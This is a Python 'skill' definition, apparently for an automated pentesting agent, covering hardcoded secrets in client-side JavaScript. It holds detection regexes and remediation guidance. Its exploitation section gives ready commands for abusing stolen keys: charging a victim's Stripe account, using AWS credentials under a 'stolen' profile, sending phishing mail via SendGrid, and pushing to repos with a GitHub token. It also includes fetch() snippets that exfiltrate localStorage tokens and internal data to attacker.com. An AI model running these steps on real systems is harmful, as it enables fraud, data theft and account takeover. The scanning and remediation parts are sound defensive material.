"""
JavaScript Secrets / Client-Side Exposure Skill - Detect and exploit hardcoded secrets
"""

SKILL = {
    "id": "js_secrets",
    "name": "JavaScript Secrets & Client-Side Exposure",
    "category": "exposure",
    "severity": "high",

    "detection": """
1. CRAWL ALL JAVASCRIPT FILES using js_analyzer and web_spider:
   - Identify all .js files loaded by the website
   - Include: inline scripts, external scripts, bundled JS
   - Check: <script> tags, src attributes
   - Also check: .js files in assets, vendor, static directories

2. SCAN FOR HARDCODED SECRETS with specific patterns:

   a) API Keys and Tokens:
      - Pattern: api_key = "sk_live_[a-zA-Z0-9]{32}"
      - Pattern: apiKey: "[a-zA-Z0-9_-]{32,}"
      - Pattern: API-KEY: "[a-zA-Z0-9]{40,}"
      - Common vars: API_KEY, api_secret, access_token, private_key

   b) AWS Credentials:
      - Pattern: AKIA[0-9A-Z]{16}  (AWS Access Key ID)
      - Pattern: aws_secret_access_key = "..."
      - Pattern: aws_access_key_id = "..."

   c) OAuth Tokens:
      - Pattern: oauth_token = "..."
      - Pattern: access_token: "..."
      - Pattern: refresh_token: "..."
      - Pattern: Bearer [a-zA-Z0-9_-]{32,}

   d) Database Credentials:
      - Pattern: mongodb://user:pass@host
      - Pattern: mysql://user:pass@host
      - Pattern: postgres://user:pass@host
      - Pattern: password: "..."
      - Pattern: db_password = "..."

   e) Firebase/Cloud Keys:
      - Pattern: firebase_api_key = "..."
      - Pattern: firebaseConfig = {apiKey: "..."}
      - Pattern: projectId: "..."
      - Pattern: databaseURL: "..."

   f) GitHub Tokens:
      - Pattern: github_token = "ghp_[a-zA-Z0-9]{36}"
      - Pattern: github_key = "..."

   g) Stripe Keys:
      - Pattern: sk_live_[a-zA-Z0-9]{32}  (Stripe Secret Key)
      - Pattern: pk_live_[a-zA-Z0-9]{32}  (Stripe Publishable Key - less critical)

   h) SendGrid, Mailgun, Other Services:
      - Pattern: sendgrid_api_key = "SG.[a-zA-Z0-9_-]+"
      - Pattern: mailgun_api_key = "key-[a-zA-Z0-9]{32}"

   i) Private URLs and Internal Endpoints:
      - Pattern: https://internal.company.com
      - Pattern: https://admin.target.com
      - Pattern: https://api-staging.target.com
      - Pattern: 192.168.*, 10.*, 172.16.*
      - Pattern: localhost:*, 127.0.0.1:*

   j) Debug Flags:
      - Pattern: DEBUG = true
      - Pattern: debug: true
      - Pattern: isDevelopment = true
      - Pattern: enableDebug: true

   k) Google API Keys:
      - Pattern: AIza[0-9A-Za-z\\-_]{35}
      - Pattern: google_api_key = "..."

3. LOOK FOR SOURCE MAPS (.js.map files):
   a) Source maps reveal original source code:
      - Check if /js/app.js.map exists
      - Check if /js/bundle.map exists
      - Look for sourceMappingURL comments in JS

   b) Example:
      ```javascript
      // At end of minified JS:
      //# sourceMappingURL=app.js.map
      // If accessible, source map reveals original code
      ```

4. CHECK BROWSER DEVTOOLS STORAGE:
   a) LocalStorage:
      - curl https://target.com | grep -i "localStorage\\|sessionStorage"
      - Look for: tokens, api_keys, user_data stored in JS

   b) IndexedDB:
      - Can contain large datasets, sometimes secrets

   c) SessionStorage:
      - Similar to localStorage, session-based

5. EXAMINE OBFUSCATED/MINIFIED CODE:
   a) Even minified JS can be reverse-engineered:
      - Variable names might be extracted
      - Strings often visible in minified code
      - Example: function f(k){return fetch('https://internal.com/api'+k)}
      - Even minified, the URL is visible

6. SCAN WITH JS_ANALYZER TOOL:
   ```bash
   js_analyzer --target https://target.com --extract-secrets
   # Returns: found API keys, tokens, internal URLs, debug flags
   ```

7. COMMON EXPOSURE LOCATIONS:
   a) Configuration objects:
      ```javascript
      // Often at start of page
      const config = {
          apiKey: "...",
          databaseURL: "...",
          projectId: "..."
      };
      ```

   b) Analytics/Tracking scripts:
      ```javascript
      // Google Analytics often contains API keys
      ga('create', 'UA-XXXXXX-X');
      // Amplitude API key
      amplitude.init('API_KEY');
      ```

   c) Vendor libraries:
      ```javascript
      // Chart.js, Maps, etc often contain keys
      mapboxgl.accessToken = 'pk_live_...';
      new google.maps.Map(...); // May have key in attributes
      ```

   d) Service worker files:
      - /sw.js
      - /service-worker.js
      - Often contain configuration with secrets

8. RED FLAGS in Code:
   - Variables named: secret, password, key, token, api, credential
   - Hardcoded URLs with /admin/, /internal/, /staging/
   - Try/catch blocks swallowing sensitive errors
   - Comments referencing credentials: "TODO: remove hardcoded key"
   - Environment-like variable assignment in client code
""",

    "exploitation": """
1. USE EXTRACTED API KEYS TO ACCESS THIRD-PARTY SERVICES:

   a) Stripe Key found: sk_live_abc123...
      ```bash
      # Create charges with victim's Stripe account
      curl https://api.stripe.com/v1/charges \\
           -H "Authorization: Bearer sk_live_abc123..." \\
           -d amount=10000 \\
           -d currency=usd \\
           -d source=tok_visa
      # Charge $100 to victim's account

      # List all customers/payments
      curl https://api.stripe.com/v1/customers \\
           -H "Authorization: Bearer sk_live_abc123..."
      # Get all customer data, transaction history
      ```

   b) AWS Key found: AKIA[0-9A-Z]{16} + secret
      ```bash
      # Configure AWS CLI
      aws configure --profile stolen
      # Enter: AKIA... (access key), secret_key

      # List S3 buckets
      aws s3 ls --profile stolen
      # Access all buckets, download sensitive data

      # List EC2 instances
      aws ec2 describe-instances --profile stolen
      # Discover infrastructure

      # Create reverse shell / backdoor
      aws lambda invoke --profile stolen --function-name ... out.json
      ```

   c) SendGrid API Key: SG.xxxxx
      ```bash
      # Send emails from victim's SendGrid account
      curl --request POST \\
           --url https://api.sendgrid.com/v3/mail/send \\
           --header "Authorization: Bearer SG.xxxxx" \\
           --header "Content-Type: application/json" \\
           --data '{
             "personalizations": [{
               "to": [{"email": "attacker@evil.com"}],
               "subject": "Pwned"
             }],
             "from": {"email": "noreply@target.com"},
             "content": [{"type": "text/plain", "value": "Stolen credentials"}]
           }'

      # Victim's email domain now sending attacker's emails
      # Can send phishing emails, abuse their reputation
      ```

   d) GitHub Token: ghp_xxxxx
      ```bash
      # Access all repositories
      curl -H "Authorization: token ghp_xxxxx" \\
           https://api.github.com/user/repos

      # Clone private repos
      git clone https://ghp_xxxxx@github.com/user/private-repo.git

      # Push code to modify repos
      git commit --amend
      git push https://ghp_xxxxx@github.com/user/repo.git

      # Access all issues, pull requests, secrets
      curl -H "Authorization: token ghp_xxxxx" \\
           https://api.github.com/repos/user/repo/secrets
      ```

2. USE INTERNAL URLs FOR SERVER-SIDE ACCESS:

   a) Internal API URL found: https://api-internal.target.com
      ```bash
      # Attacker can't access directly from internet (firewall blocks)
      # But if JavaScript in browser makes requests to it
      # Attacker can force victim's browser to access it

      # Example: JavaScript in attacker's domain
      fetch('https://api-internal.target.com/admin/users')
          .then(r => r.json())
          .then(data => fetch('https://attacker.com/steal?data=' + JSON.stringify(data)))
      # Victim's browser (inside corporate network) can access internal API
      # Exfiltrate data to attacker's server
      ```

   b) Admin panel URL found: https://admin.target.com
      ```bash
      # Try to access without authentication
      curl https://admin.target.com
      # May be accessible, or reveal other info

      # Use in phishing or access after compromise
      ```

   c) Database connection string found: mongodb://user:pass@mongo.internal:27017/db
      ```bash
      # Connect directly
      mongo -u user -p pass mongodb://mongo.internal:27017/db
      # Read/write database directly, no app layer protection
      ```

3. USE SOURCE MAPS TO READ ORIGINAL CODE:

   a) Download source map:
      ```bash
      curl https://target.com/js/app.js.map > app.js.map
      ```

   b) Decompile back to original source:
      ```bash
      # Using chrome-devtools or CLI tools
      source-map-visualization app.js.map
      # Get readable original JavaScript source
      ```

   c) Now that you have source code:
      - Find other vulnerabilities not visible in minified code
      - Discover business logic, algorithms
      - Find hardcoded paths, configurations
      - Find commented-out debug code with secrets
      - Understand architecture to find attack vectors

4. FIREBASE CONFIG EXPLOITATION:

   a) Found in JavaScript:
      ```javascript
      const firebaseConfig = {
          apiKey: "AIza...",
          authDomain: "project.firebaseapp.com",
          databaseURL: "https://project.firebaseio.com",
          projectId: "my-project"
      };
      ```

   b) Initialize and access database:
      ```javascript
      firebase.initializeApp(firebaseConfig);
      const db = firebase.firestore();

      // Access public database
      db.collection('users').get().then(snapshot => {
          snapshot.docs.forEach(doc => console.log(doc.data()));
      });

      // If Firestore rules are misconfigured (allow read if authenticated)
      // Create anonymous user, access all data
      firebase.auth().signInAnonymously().then(() => {
          db.collection('sensitive-data').get().then(snap => {
              // Read sensitive data
          });
      });
      ```

5. EXPLOIT DEBUG FLAGS:

   a) Found: DEBUG = true or isDevelopment = true
      ```javascript
      // Application logs more data to console
      // Contains: API calls, user data, errors with stack traces
      // Open DevTools → Console → see all logged data

      // Example output:
      // "Fetching user data for ID 123"
      // "Token: eyJhbGciOiJIUzI1NiIs..."
      // "Error: Database connection failed: mongo://user:pass@internal..."
      ```

   b) Use console output to find:
      - API endpoints being called
      - Tokens and credentials
      - Error messages revealing system info
      - User IDs, data structure patterns

6. GOOGLE API KEY EXPLOITATION:

   a) Found: AIza[0-9A-Za-z\\-_]{35}
      ```bash
      # Google Maps API Key (often not restricted)
      # Can make unlimited API calls, high cost
      curl "https://maps.googleapis.com/maps/api/geocode/json?address=1600+Amphitheatre+Parkway&key=AIza..."
      # Cost attacker $0, billed to victim

      # Google Places API
      curl "https://maps.googleapis.com/maps/api/place/textsearch/json?query=restaurants&key=AIza..."

      # YouTube API (list user data, upload videos, etc)
      curl "https://www.googleapis.com/youtube/v3/channels?mine=true&key=AIza..."
      ```

   b) Exploitation impact:
      - Drive up API costs (can be $10,000+/month if unrestricted)
      - Use victim's quota to attack Google services
      - If key has user delegation, access user's data

7. STORED TOKENS IN LOCALSTORAGE:

   a) Attacker-controlled page:
      ```javascript
      // If admin visits attacker's site with valid session
      // JavaScript can access localStorage
      const token = localStorage.getItem('auth_token');
      fetch('https://attacker.com/steal?token=' + token);
      ```

   b) Session hijacking via XSS:
      ```javascript
      // If you find XSS vulnerability too
      // Combine with this to steal stored tokens
      const allStorage = {...localStorage, ...sessionStorage};
      fetch('https://attacker.com/exfil', {
          method: 'POST',
          body: JSON.stringify(allStorage)
      });
      ```

8. RECONNAISSANCE FOR FURTHER ATTACKS:

   a) Discovered secrets help for:
      - Finding more vulnerabilities (now you know the tech stack)
      - Social engineering (have real employee names, URLs)
      - Targeted attacks (know which services to attack)
      - Escalation (use stolen creds to access higher-value systems)
""",

    "remediation": """
1. IMMEDIATE - Remove all hardcoded secrets:

   a) Audit all JavaScript files:
      ```bash
      # Find all .js files
      find . -name "*.js" -type f

      # Search for common secret patterns
      grep -r "api_key\\|apiKey\\|API-KEY\\|secret\\|password" *.js
      grep -r "AKIA[0-9A-Z]\\{16\\}" .
      grep -r "sk_live_\\|pk_live_" .
      grep -r "ghp_\\|ghu_" .
      grep -r "AIza[0-9A-Za-z_-]\\{35\\}" .
      ```

   b) Replace hardcoded values with environment variables:
      ```javascript
      // BEFORE (vulnerable):
      const API_KEY = "sk_live_abc123xyz456";
      const API_URL = "https://internal.company.com/api";

      // AFTER (secure):
      const API_KEY = process.env.STRIPE_SECRET_KEY;
      const API_URL = process.env.API_URL;
      ```

   c) Load environment variables on server-side only:
      ```javascript
      // Node.js server (NOT sent to client)
      require('dotenv').config();
      const stripeKey = process.env.STRIPE_SECRET_KEY;

      // API endpoint that doesn't expose the key
      app.get('/api/create-payment', (req, res) => {
          // Use stripeKey internally
          stripe.charges.create({key: stripeKey, ...});
          // Never return key to client
          res.json({success: true});
      });
      ```

2. MOVE SENSITIVE OPERATIONS TO BACKEND:

   a) Payment processing example:

      BEFORE (vulnerable - client has Stripe key):
      ```javascript
      // client.js - UNSAFE
      stripe.setPublishableKey('pk_live_abc...');
      stripe.card.createToken({...}, function(status, response) {
          if (status === 200) {
              var charge = {token: response.id};
              // Send to server
          }
      });
      ```

      AFTER (secure - server handles Stripe):
      ```javascript
      // client.js
      fetch('/api/create-payment', {
          method: 'POST',
          body: JSON.stringify({amount: 1000})
      });

      // server.js
      const stripe = require('stripe')(process.env.STRIPE_SECRET_KEY);

      app.post('/api/create-payment', (req, res) => {
          stripe.charges.create({
              amount: req.body.amount,
              currency: 'usd',
              source: req.body.token_id  // Token only, not full key
          }, (err, charge) => {
              res.json({success: !err});
          });
      });
      ```

   b) Database connections:
      ```javascript
      // BEFORE (client-side connection):
      // NEVER DO THIS
      const mongo = require('mongodb');
      const client = new mongo.MongoClient('mongodb://user:pass@host');

      // AFTER (server-side only):
      // server.js
      const mongo = require('mongodb');
      const client = new mongo.MongoClient(process.env.MONGODB_URL);

      app.get('/api/documents', (req, res) => {
          const collection = client.db().collection('documents');
          collection.find({user_id: req.user.id}).toArray((err, docs) => {
              res.json(docs);
          });
      });

      // client.js
      fetch('/api/documents').then(r => r.json()).then(data => {
          // Use data from server
      });
      ```

3. NEVER STORE TOKENS IN LOCALSTORAGE:

   a) VULNERABLE:
      ```javascript
      // Stored in localStorage, accessible via XSS
      localStorage.setItem('auth_token', token);
      ```

   b) SECURE:
      ```javascript
      // Store in httpOnly, Secure, SameSite cookie
      // Server sends: Set-Cookie: auth_token=xyz; HttpOnly; Secure; SameSite=Strict
      // JavaScript cannot access it even with XSS

      // If you must store in JS:
      // Store in memory only, lost on page refresh
      let authToken = token;  // Lost when user closes tab
      ```

4. REMOVE SOURCE MAPS FROM PRODUCTION:

   a) Check for source maps:
      ```bash
      curl -I https://target.com/js/app.js
      # Look for: sourceMappingURL comment
      # Or try: curl https://target.com/js/app.js.map
      ```

   b) Build configuration to exclude source maps:

      Webpack:
      ```javascript
      // webpack.config.js
      module.exports = {
          // Development
          devtool: 'source-map',  // Include for debugging locally

          // Production
          devtool: process.env.NODE_ENV === 'production' ? false : 'source-map',
      };
      ```

      Other build tools:
      ```json
      // .env.production
      GENERATE_SOURCEMAP=false
      ```

   c) Also remove .map files from deployment:
      ```bash
      # In deployment script
      rm -f dist/js/*.map
      rm -f build/*.js.map
      ```

5. DISABLE DEBUG FLAGS IN PRODUCTION:

   a) Use environment-based flags:
      ```javascript
      // config.js
      const config = {
          DEBUG: process.env.NODE_ENV !== 'production',
          LOG_LEVEL: process.env.NODE_ENV === 'production' ? 'error' : 'debug',
          REVEAL_ERRORS: process.env.NODE_ENV === 'development'
      };

      export default config;
      ```

   b) Disable console logging in production:
      ```javascript
      if (process.env.NODE_ENV === 'production') {
          console.log = () => {};
          console.warn = () => {};
          console.error = () => {};
      }
      ```

6. IMPLEMENT SECURE API COMMUNICATION:

   a) Use Backend-for-Frontend (BFF) pattern:
      ```
      User Browser → Your Frontend Server (same domain)
                      ↓ (internal, no CORS)
                  Your Backend API
                      ↓
                  Third-party APIs (Stripe, SendGrid, etc)
      ```

      Frontend never directly talks to third-party APIs
      All auth happens server-to-server

   b) Example:
      ```javascript
      // client.js
      fetch('/api/send-email', {
          method: 'POST',
          body: JSON.stringify({to: 'user@example.com'})
      });

      // server.js
      const sendgrid = require('@sendgrid/mail');
      sendgrid.setApiKey(process.env.SENDGRID_API_KEY);

      app.post('/api/send-email', (req, res) => {
          sendgrid.send({
              to: req.body.to,
              from: process.env.SENDER_EMAIL,
              subject: 'Test',
              text: 'Test email'
          }).then(() => res.json({success: true}));
      });
      ```

7. IMPLEMENT SECURITY HEADERS:

   ```nginx
   # nginx.conf
   add_header Content-Security-Policy "default-src 'self'; script-src 'self' 'unsafe-inline'" always;
   add_header X-Content-Type-Options "nosniff" always;
   add_header X-Frame-Options "DENY" always;
   add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
   ```

   Prevents:
   - Inline scripts (reduces XSS impact)
   - External script injection
   - Clickjacking
   - Mixed HTTP/HTTPS

8. SECURE FIREBASE/CLOUD CONFIG:

   a) Don't use API key auth for sensitive operations:
      ```javascript
      // BEFORE (vulnerable)
      firebaseApp.initializeApp({
          apiKey: "AIza...",  // Public key, don't use for auth
          ...
      });
      db.collection('users').get();  // Unrestricted access

      // AFTER (secure)
      firebaseApp.initializeApp({
          apiKey: "AIza...",  // Still needed for public API
          ...
      });

      // Use auth instead
      firebase.auth().signInWithEmailAndPassword(email, password)
          .then(() => {
              // Now access database with proper auth rules
              db.collection('users').doc(userId).get();
          });
      ```

   b) Firestore Rules:
      ```
      // BEFORE (vulnerable)
      match /{document=**} {
          allow read, write: if request.auth != null;
      }

      // AFTER (secure)
      match /users/{userId} {
          allow read, write: if request.auth.uid == userId;
      }

      match /admin/{document=**} {
          allow read, write: if request.auth.token.admin == true;
      }
      ```

9. VERIFICATION:

   ```bash
   # Scan all JS files
   for f in $(find . -name "*.js"); do
       grep -i "api.key\\|apikey\\|secret\\|password" "$f" && echo "FOUND SECRET in $f"
   done

   # Check for source maps
   curl -s https://target.com/js/app.js | grep -i "sourceMappingURL"

   # Check localStorage usage
   grep -r "localStorage\\|sessionStorage" *.js

   # Verify API keys not in responses
   curl https://target.com/api/user | grep -i "api_key\\|secret"
   # Should not contain any secrets
   ```

10. ROTATE ALL EXPOSED CREDENTIALS:

    ```bash
    # For each exposed credential:
    # 1. Revoke it immediately
    # 2. Create new credential
    # 3. Update all references in code
    # 4. Deploy to production
    # 5. Monitor for abuse

    # Stripe key exposed:
    # - Go to Dashboard → API Keys
    # - Click "Revoke" on exposed key
    # - Create new key
    # - Update environment variables
    # - Restart application

    # AWS key exposed:
    # - AWS Console → IAM → Users
    # - Delete exposed access key
    # - Create new access key
    # - Update CI/CD, servers with new key

    # GitHub token exposed:
    # - GitHub Settings → Developer Settings → Personal Access Tokens
    # - Delete exposed token
    # - Create new token
    # - Update deployment scripts
    ```
""",

    "tools": ["js_analyzer", "web_spider", "dir_bruteforce"],

    "payloads": [
        # API Key patterns
        "api_key\\s*[:=]\\s*['\"]([a-zA-Z0-9_-]{32,})['\"]",
        "apiKey\\s*[:=]\\s*['\"]([a-zA-Z0-9_-]{32,})['\"]",
        "API-KEY\\s*[:=]\\s*['\"]([a-zA-Z0-9_-]{40,})['\"]",

        # AWS
        "AKIA[0-9A-Z]{16}",
        "aws_secret_access_key\\s*[:=]\\s*['\"]([a-zA-Z0-9/+]{40})['\"]",
        "aws_access_key_id\\s*[:=]\\s*['\"]([A-Z0-9]{20})['\"]",

        # OAuth/Token patterns
        "access_token\\s*[:=]\\s*['\"]([a-zA-Z0-9._-]{32,})['\"]",
        "refresh_token\\s*[:=]\\s*['\"]([a-zA-Z0-9._-]{32,})['\"]",
        "Bearer\\s+[a-zA-Z0-9._-]{32,}",

        # Database
        "mongodb://[^@]+@[^/]+",
        "mysql://[^@]+@[^/]+",
        "postgres://[^@]+@[^/]+",
        "password\\s*[:=]\\s*['\"]([^'\"]{6,})['\"]",
        "db_password\\s*[:=]\\s*['\"]([^'\"]{6,})['\"]",

        # Firebase
        "firebase[^,}]*apiKey[^,}]*['\"]([a-zA-Z0-9_-]{39})['\"]",
        "firebaseConfig\\s*=\\s*\\{[^}]*apiKey",
        "databaseURL\\s*[:=]\\s*['\"]https://[a-zA-Z0-9-]+\\.firebaseio\\.com['\"]",

        # Stripe
        "sk_live_[a-zA-Z0-9]{32,}",
        "pk_live_[a-zA-Z0-9]{32,}",

        # SendGrid
        "SG\\.[a-zA-Z0-9_-]{64,}",

        # GitHub
        "ghp_[a-zA-Z0-9]{36,}",
        "ghu_[a-zA-Z0-9]{36,}",

        # Google
        "AIza[0-9A-Za-z\\-_]{35}",

        # Internal URLs
        "https://internal\\.",
        "https://admin\\.",
        "https://[a-zA-Z0-9]+-internal\\.",
        "192\\.168\\.",
        "10\\.\\d{1,3}\\.",
        "172\\.(1[6-9]|2[0-9]|3[01])\\.",
        "localhost:\\d+",
        "127\\.0\\.0\\.1:\\d+",

        # Debug flags
        "DEBUG\\s*[:=]\\s*true",
        "debug\\s*[:=]\\s*true",
        "isDevelopment\\s*[:=]\\s*true",
        "enableDebug\\s*[:=]\\s*true",

        # Source maps
        "sourceMappingURL=.*\\.js\\.map",
        "\\.js\\.map",
    ],

    "references": [
        "OWASP A02:2021 - Cryptographic Failures",
        "OWASP A05:2021 - Security Misconfiguration",
        "CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor",
        "CWE-312 - Cleartext Storage of Sensitive Information",
        "CWE-615 - Inclusion of Sensitive Information in Source Code Comments",
        "CWE-798 - Use of Hard-Coded Credentials",
        "https://owasp.org/www-community/Sensitive_Data_Exposure",
        "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html",
        "https://gitguardian.com/",
        "https://github.com/trufflesecurity/trufflehog",
    ],
}
